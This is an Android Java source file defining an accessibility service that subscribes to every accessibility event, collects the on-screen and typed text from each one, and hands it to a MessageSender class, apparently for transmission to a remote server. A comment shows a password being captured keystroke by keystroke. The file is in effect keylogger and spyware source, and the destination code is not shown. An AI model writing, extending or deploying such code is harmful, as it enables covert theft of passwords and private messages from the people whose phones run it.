package me.paradis.test01;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.view.accessibility.AccessibilityEvent;
import android.widget.Toast;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;

public class MyAccessibilityService extends AccessibilityService {

    public void send(String s1){
        System.out.println("called send");

        MessageSender messageSender = new MessageSender();
        messageSender.execute(s1);

        // if server = up messageSender.execute txt
        // else txt += s1

    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        System.out.println("called on accessibility event");

        StringBuilder sb = new StringBuilder();
        for (CharSequence s : event.getText()) {
            sb.append(s);
        }

        // password
        // p pa pas pass passw passwo passwor password

        String l1 = sb.toString();

        if (!l1.equals("") && !l1.equals(" ")){
            System.out.println("l1: " + l1);
            send(l1);
        }
    }

    @Override
    public void onInterrupt() {
        send("[-] Interrupted !!! ");
    }

    @Override
    protected void onServiceConnected() {
        System.out.println("connected");

        super.onServiceConnected();
        send("[+] Connected");
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.flags = AccessibilityServiceInfo.DEFAULT;
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        setServiceInfo(info);
    }

}
